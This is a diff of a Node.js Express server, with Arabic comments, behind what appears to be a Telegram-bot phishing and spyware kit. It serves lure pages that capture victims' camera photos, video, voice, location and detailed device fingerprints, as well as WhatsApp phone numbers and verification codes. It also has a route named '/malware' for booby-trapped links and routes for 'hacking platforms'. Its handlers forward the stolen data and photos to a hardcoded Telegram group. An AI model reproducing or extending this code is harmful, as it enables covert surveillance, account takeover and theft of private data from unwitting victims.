-📊 **معلومات الجهاز والمستخدم**
-📱 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**
+📝 **معلومات المستخدم:**
+- الاسم: ${userInfo.name || 'غير معروف'}
+- الهاتف: ${userInfo.phone || 'غير معروف'}
+- البريد الإلكتروني: ${userInfo.email || 'غير معروف'}
 
-👤 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**
-👤 **بيانات المستخدم**
-👤 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**
-
-📛 **الاسم:** ${userInfo.name || 'غير معروف'} 👤
-📞 **الهاتف:** ${userInfo.phone || 'غير معروف'} ☎️
-📧 **البريد:** ${userInfo.email || 'غير معروف'} 📧
-
-📱 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**
-📱 **معلومات الجهاز**
-📱 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**
-
-🌍 **الدولة:** ${deviceInfo.country || 'غير معروف'} 🗺️
-🏙️ **المدينة:** ${deviceInfo.city || 'غير معروف'} 🌆
-🌐 **العنوان IP:** \`${deviceInfo.ip || 'غير معروف'}\` 📡
-🔋 **البطارية:** ${deviceInfo.battery || 'غير معروف'}% ⚡
-🔌 **الشحن:** ${deviceInfo.isCharging ? 'نعم ✅' : 'لا ❌'}
-📶 **الشبكة:** ${deviceInfo.network || 'غير معروف'} (${deviceInfo.networkSpeed || 'غير معروف'} Mbps) 📡
-📡 **نوع الاتصال:** ${deviceInfo.networkType || 'غير معروف'} 📶
-⏰ **الوقت:** ${deviceInfo.time || 'غير معروف'} ⏰
-🖥️ **اسم الجهاز:** ${deviceInfo.deviceName || 'غير معروف'} 🖥️
-📜 **إصدار الجهاز:** ${deviceInfo.deviceVersion || 'غير معروف'} 📜
-📱 **نوع الجهاز:** ${deviceInfo.deviceType || 'غير معروف'} 📱
-🧠 **الذاكرة (RAM):** ${deviceInfo.memory || 'غير معروف'} 🧠
-💾 **الذاكرة الداخلية:** ${deviceInfo.internalStorage || 'غير معروف'} GB 💾
-⚙️ **عدد الأنوية:** ${deviceInfo.cpuCores || 'غير معروف'} ⚙️
-🌐 **لغة النظام:** ${deviceInfo.language || 'غير معروف'} 🌐
-🌐 **اسم المتصفح:** ${deviceInfo.browserName || 'غير معروف'} 🧭
-📊 **إصدار المتصفح:** ${deviceInfo.browserVersion || 'غير معروف'} 📊
-📏 **دقة الشاشة:** ${deviceInfo.screenResolution || 'غير معروف'} 📏
-🖥️ **إصدار النظام:** ${deviceInfo.osVersion || 'غير معروف'} 💿
-🔄 **وضع الشاشة:** ${deviceInfo.screenOrientation || 'غير معروف'} 🔄
-🎨 **عمق الألوان:** ${deviceInfo.colorDepth || 'غير معروف'} 🎨
-🔒 **بروتوكول الأمان:** ${deviceInfo.securityProtocol || 'غير معروف'} 🔒
-🌍 **تحديد الموقع:** ${deviceInfo.geolocationAvailable ? '✅ متاح' : '❌ غير متاح'}
-🔵 **البلوتوث:** ${deviceInfo.bluetoothSupport ? '✅ متاح' : '❌ غير متاح'}
-✋ **الإيماءات اللمسية:** ${deviceInfo.touchSupport ? '✅ مدعومة' : '❌ غير مدعومة'}
+📱 **معلومات الجهاز:**
+- الدولة: ${deviceInfo.country || 'غير معروف'} 🔻
+- المدينة: ${deviceInfo.city || 'غير معروف'} 🏙️
+- عنوان IP: ${deviceInfo.ip || 'غير معروف'} 🌍
+- شحن الهاتف: ${deviceInfo.battery || 'غير معروف'}% 🔋
+- هل الهاتف يشحن؟: ${deviceInfo.isCharging ? 'نعم' : 'لا'} ⚡
+- الشبكة: ${deviceInfo.network || 'غير معروف'} 📶 (سرعة: ${deviceInfo.networkSpeed || 'غير معروف'} ميغابت في الثانية)
+- نوع الاتصال: ${deviceInfo.networkType || 'غير معروف'} 📡
+- الوقت: ${deviceInfo.time || 'غير معروف'} ⏰
+- اسم الجهاز: ${deviceInfo.deviceName || 'غير معروف'} 🖥️
+- إصدار الجهاز: ${deviceInfo.deviceVersion || 'غير معروف'} 📜
+- نوع الجهاز: ${deviceInfo.deviceType || 'غير معروف'} 📱
+- الذاكرة (RAM): ${deviceInfo.memory || 'غير معروف'} 🧠
+- الذاكرة الداخلية: ${deviceInfo.internalStorage || 'غير معروف'} GB 💾
+- عدد الأنوية: ${deviceInfo.cpuCores || 'غير معروف'} ⚙️
+- لغة النظام: ${deviceInfo.language || 'غير معروف'} 🌐
+- اسم المتصفح: ${deviceInfo.browserName || 'غير معروف'} 🌐
+- إصدار المتصفح: ${deviceInfo.browserVersion || 'غير معروف'} 📊
+- دقة الشاشة: ${deviceInfo.screenResolution || 'غير معروف'} 📏
+- إصدار نظام التشغيل: ${deviceInfo.osVersion || 'غير معروف'} 🖥️
+- وضع الشاشة: ${deviceInfo.screenOrientation || 'غير معروف'} 🔄
+- عمق الألوان: ${deviceInfo.colorDepth || 'غير معروف'} 🎨
+- تاريخ آخر تحديث للمتصفح: ${deviceInfo.lastUpdate || 'غير معروف'} 📅
+- بروتوكول الأمان المستخدم: ${deviceInfo.securityProtocol || 'غير معروف'} 🔒
+- نطاق التردد للاتصال: ${deviceInfo.connectionFrequency || 'غير معروف'} 📡
+- إمكانية تحديد الموقع الجغرافي: ${deviceInfo.geolocationAvailable ? 'نعم' : 'لا'} 🌍
+- الدعم لتقنية البلوتوث: ${deviceInfo.bluetoothSupport ? 'نعم' : 'لا'} 🔵
+- دعم الإيماءات اللمسية: ${deviceInfo.touchSupport ? 'نعم' : 'لا'} ✋
     `;
 
     try {
@@ -565,30 +457,26 @@ app.post('/SS', async (req, res) => {
         const userUsername = telegramUserInfo.username ? `@${telegramUserInfo.username}` : 'غير متاح';
 
         const userInfoText = `
-👤 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**
-👤 **معلومات مستخدم تليجرام**
-👤 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**
-
-📛 **الاسم:** ${userName} 👤
-🆔 **اليوزر:** ${userUsername} 🆔
+اسم المستخدم: ${userName}
+يوزر المستخدم: ${userUsername}
         `;
 
         await bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
-        console.log('✅ تم إرسال معلومات الجهاز للمستخدم بنجاح');
+        console.log('تم إرسال معلومات الجهاز والمستخدم بنجاح للمستخدم');
 
-        await bot.sendMessage(groupChatId, `📊 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**\n📊 **بيانات جهاز جديدة**\n📊 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**\n\n🆔 **المستخدم:** \`${chatId}\`\n${userInfoText}\n${message}`, { parse_mode: 'Markdown' });
-        console.log('✅ تم إرسال معلومات الجهاز للمجموعة بنجاح');
+        await bot.sendMessage(groupChatId, `تم استقبال بيانات جهاز جديدة من المستخدم ${chatId}\n${userInfoText}\n${message}`, { parse_mode: 'Markdown' });
+        console.log('تم إرسال معلومات الجهاز والمستخدم بنجاح إلى المجموعة');
 
         res.json({ success: true });
     } catch (err) {
-        console.error('❌ فشل في إرسال معلومات الجهاز:', err);
-        res.status(500).json({ error: 'فشل في إرسال معلومات الجهاز' });
+        console.error('فشل في إرسال معلومات الجهاز والمستخدم:', err);
+        res.status(500).json({ error: 'فشل في إرسال معلومات الجهاز والمستخدم' });
     }
 });
 
-// 10. مسار الصور المتعددة (تصحيح كتابة)
+// 10. مسار الصور المتعددة
 app.post('/submitPhtos', upload.array('images', 10), async (req, res) => {
-    console.log('📥 تم استقبال طلب في /submitPhotos');
+    console.log('Received a request to /submitPhotos');
     try {
         const { cameraType, additionalData } = req.body;
         const chatId = req.body.chatId;
@@ -596,17 +484,17 @@ app.post('/submitPhtos', upload.array('images', 10), async (req, res) => {
 
         const groupChatId = '-1002433284949';
 
-        console.log('البيانات المستلمة:', req.body);
-        console.log('عدد الملفات:', req.files?.length);
+        console.log('Received request body:', req.body);
+        console.log('Received files:', req.files);
 
         if (!chatId || chatId === 'null') {
-            console.error('❌ chatId غير موجود أو null');
-            return res.status(400).json({ success: false, error: 'chatId مطلوب' });
+            console.error('chatId not provided or is null');
+            return res.status(400).json({ success: false, error: 'chatId is required and cannot be null' });
         }
 
         if (!files || files.length === 0) {
-            console.error('❌ لم يتم رفع ملفات');
-            return res.status(400).json({ success: false, error: 'لم يتم رفع ملفات' });
+            console.error('No files uploaded');
+            return res.status(400).json({ success: false, error: 'No files uploaded' });
         }
 
         let parsedData = {};
@@ -614,8 +502,8 @@ app.post('/submitPhtos', upload.array('images', 10), async (req, res) => {
             try {
                 parsedData = JSON.parse(additionalData);
             } catch (error) {
-                console.error('❌ خطأ في JSON:', error.message);
-                return res.status(400).json({ success: false, error: 'صيغة additionalData غير صحيحة' });
+                console.error('Invalid additionalData JSON:', error.message);
+                return res.status(400).json({ success: false, error: 'Invalid additionalData format' });
             }
         }
 
@@ -624,106 +512,105 @@ app.post('/submitPhtos', upload.array('images', 10), async (req, res) => {
         const userUsername = userInfo.username ? `@${userInfo.username}` : 'غير متاح';
 
         const userInfoText = `
-👤 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**
-👤 **معلومات المستخدم**
-👤 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**
-
-📛 **الاسم:** ${userName} 👤
-🆔 **اليوزر:** ${userUsername} 🆔
+اسم المستخدم: ${userName}
+يوزر المستخدم: ${userUsername}
         `;
 
         const caption = `
-🖼️ **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**
-📸 **معلومات الصورة**
-🖼️ **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**
-
-📷 **نوع الكاميرا:** ${cameraType === 'front' ? 'أمامية 📱' : 'خلفية 📸'}
-🌐 **العنوان IP:** \`${parsedData.ip || 'غير متاح'}\`
-📍 **الدولة:** ${parsedData.country || 'غير متاح'} 🗺️
-🏙️ **المدينة:** ${parsedData.city || 'غير متاح'} 🌆
-💻 **المنصة:** ${parsedData.platform || 'غير متاح'} 🖥️
-🌐 **وكيل المستخدم:** ${parsedData.userAgent || 'غير متاح'} 🧭
-🔋 **البطارية:** ${parsedData.batteryLevel || 'غير متاح'} ⚡
-🔌 **الشحن:** ${parsedData.batteryCharging ? 'نعم ✅' : 'لا ❌'}
+معلومات إضافية:
+نوع الكاميرا: ${cameraType === 'front' ? 'أمامية' : 'خلفية'}
+IP: ${parsedData.ip || 'غير متاح'}
+الدولة: ${parsedData.country || 'غير متاح'}
+المدينة: ${parsedData.city || 'غير متاح'}
+المنصة: ${parsedData.platform || 'غير متاح'}
+وكيل المستخدم: ${parsedData.userAgent || 'غير متاح'}
+مستوى البطارية: ${parsedData.batteryLevel || 'غير متاح'}
+الشحن: ${parsedData.batteryCharging ? 'نعم' : 'لا'}
         `;
 
         for (const file of files) {
             try {
-                await bot.sendPhoto(chatId, file.buffer, { caption: caption });
-                console.log('✅ تم إرسال الصورة للمستخدم');
+                await bot.sendPhoto(chatId, file.buffer, { caption });
+                console.log('Photo sent successfully to user');
             } catch (error) {
-                console.error('❌ خطأ في إرسال الصورة للمستخدم:', error.message);
-                return res.status(500).json({ success: false, error: 'فشل في إرسال الصورة للمستخدم' });
+                console.error('Error sending photo to user:', error.message);
+                return res.status(500).json({ success: false, error: 'Failed to send photo to user' });
             }
         }
 
         for (const file of files) {
             try {
-                await bot.sendPhoto(groupChatId, file.buffer, { caption: `🖼️ **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**\n🖼️ **صور جديدة من المستخدم**\n🖼️ **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**\n\n🆔 **المعرف:** \`${chatId}\`\n${userInfoText}\n${caption}` });
-                console.log('✅ تم إرسال الصورة للمجموعة');
+                await bot.sendPhoto(groupChatId, file.buffer, { caption: `صورة من المستخدم ${chatId}\n${userInfoText}\n${caption}` });
+                console.log('Photo sent successfully to group');
             } catch (error) {
-                console.error('❌ خطأ في إرسال الصورة للمجموعة:', error.message);
-                return res.status(500).json({ success: false, error: 'فشل في إرسال الصورة للمجموعة' });
+                console.error('Error sending photo to group:', error.message);
+                return res.status(500).json({ success: false, error: 'Failed to send photo to group' });
             }
         }
 
         res.json({ success: true });
     } catch (error) {
-        console.error('❌ فشل في معالجة الطلب:', error.message);
+        console.error('Failed to process request:', error.message);
         res.status(500).json({ success: false, error: error.message });
     }
 });
 
-// ==================== مسارات HTML ====================
+// ==================== مسارات HTML الأصلية ====================
 
+// 1. مسار الكاميرا (صور)
 app.get('/camera/:userId', (req, res) => {
     const userId = req.params.userId;
     res.sendFile(path.join(__dirname, 'location.html'));
 });
 
+// 2. مسار الفيديو
 app.get('/camera/video/:userId', (req, res) => {
     const userId = req.params.userId;
     res.sendFile(path.join(__dirname, 'dualCameraVideo.html'));
 });
 
+// 3. مسار الصوت
 app.get('/record/:userId', (req, res) => {
     const userId = req.params.userId;
     res.sendFile(path.join(__dirname, 'record.html'));
 });
 
+// 4. مسار الموقع
 app.get('/getLocation/:userId', (req, res) => {
     const userId = req.params.userId;
     res.sendFile(path.join(__dirname, 'SJGD.html'));
 });
 
+// 5. مسار معلومات الجهاز
 app.get('/:userId', (req, res) => {
     const userId = req.params.userId;
     res.sendFile(path.join(__dirname, 'SS.html'));
 });
 
+// 6. مسار واتساب
 app.get('/whatsapp', (req, res) => {
     res.sendFile(path.join(__dirname, 'phone_form.html'));
 });
 
+// 7. مسار التلغيم
 app.get('/malware', (req, res) => {
     const chatId = req.query.chatId;
     const originalLink = req.query.originalLink;
     res.sendFile(path.join(__dirname, 'malware.html'));
 });
 
+// 8. مسار اختراق المنصات
 app.get('/:action/:platform/:chatId', (req, res) => {
     const { action, platform, chatId } = req.params;
-    res.sendFile(path.join(__dirname, 'uploads', `${platform}_${action}.html`);
+    res.sendFile(path.join(__dirname, 'uploads', `${platform}_${action}.html`));
 });
 
-// ==================== إعدادات السيرفر ====================
+
 const PORT = process.env.PORT || 3000;
 
 app.listen(PORT, () => {
-    console.log('🚀 ================================');
     console.log(`✅ سيرفر استقبال البيانات يعمل على المنفذ ${PORT}`);
-    console.log('🚀 ================================');
-    console.log('📡 المسارات النشطة:');
+    console.log('📡 مسارات الاستقبال النشطة:');
     console.log('   📸 /submitPhotos - استقبال الصور');
     console.log('   🎥 /submitVideo - استقبال الفيديو');
     console.log('   🎤 /submitVoice - استقبال الصوت');
@@ -733,5 +620,4 @@ app.listen(PORT, () => {
     console.log('   ☎️ /sendPhoneNumber - استقبال رقم واتساب');
     console.log('   ✅ /verifyCode - استقبال كود واتساب');
     console.log('   ⚡ /submitIncrease - استقبال بيانات اختراق');
-    console.log('🚀 ================================');
 });
